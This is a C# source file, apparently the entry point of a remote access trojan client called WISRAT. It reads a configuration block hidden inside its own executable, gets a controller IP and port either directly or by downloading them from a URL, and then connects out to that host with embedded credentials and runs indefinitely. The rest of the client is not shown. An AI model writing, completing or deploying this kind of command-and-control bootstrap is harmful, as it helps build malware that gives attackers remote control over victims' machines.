using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using Serilog;
using Serilog.Core;

namespace WISRAT.Client
{
    public static class Program
    {
        /// <summary>
        /// Serilog Logger instance
        /// </summary>
        private static readonly Logger Logger = new LoggerConfiguration()
            .WriteTo.Console()
            .CreateLogger();

        /// <summary>
        /// Entry point of client
        /// </summary>
        /// <param name="args">Arguments</param>
        public static void Main(string[] args)
        {
            Logger.Information($"WISRat Client version {Assembly.GetEntryAssembly()?.GetName().Version}");
            var location = Assembly.GetEntryAssembly()?.Location;
            if (location != null) {
                string content = File.ReadAllText(location);
                int start = content.IndexOf("%$_WISRAT_CONFIG_START_$%", StringComparison.Ordinal) + "%$_WISRAT_CONFIG_START_$%".Length;
                int end = content.IndexOf("%$_WISRAT_CONFIG_END_$%", StringComparison.Ordinal);
                if (start == -1 || end == -1) {
                    Logger.Error("Unexpected: No config found!");
                    Environment.Exit(1);
                }
                var builder = new StringBuilder();
                for (int i = start; i < end; i++)
                    builder.Append(content[i]);
                var cfg = builder.ToString();
                var split = cfg.Split('|');
                var username = split[0];
                var password = split[1];
                IPAddress ip = null;
                int port = 0;
                try {
                    switch (split[2])
                    {
                        case "direct":
                            ip = IPAddress.Parse(split[3]);
                            port = int.Parse(split[4]);
                            break;
                        case "fetch":
                            WebClient webclient = new WebClient();
                            string data = webclient.DownloadString(split[3]);
                            Logger.Information($"Fetched connection info: {data}");
                            ip = IPAddress.Parse(data.Split(':')[0]);
                            port = int.Parse(data.Split(':')[1]);
                            break;
                        default:
                            Logger.Error("Unexpected: Invalid type");
                            Environment.Exit(1);
                            break;
                    }
                } catch {
                    Logger.Error("Unexpected: Config is invalid!");
                    Environment.Exit(1);
                }
                
                Logger.Information("Config is valid, staring client...");
                Client client = new Client(ip, port, username, password, Logger);
                Console.CancelKeyPress += (_, _) => {
                    Logger.Warning("SIGINT received, stopping...");
                    client.Dispose();
                    Environment.Exit(0);
                };
                Logger.Information("Client connected!");
                while(true) { }
            } else {
                Logger.Error("Unexpected: EntryAssembly Location is null");
                Environment.Exit(1);
            }
        }
    }
}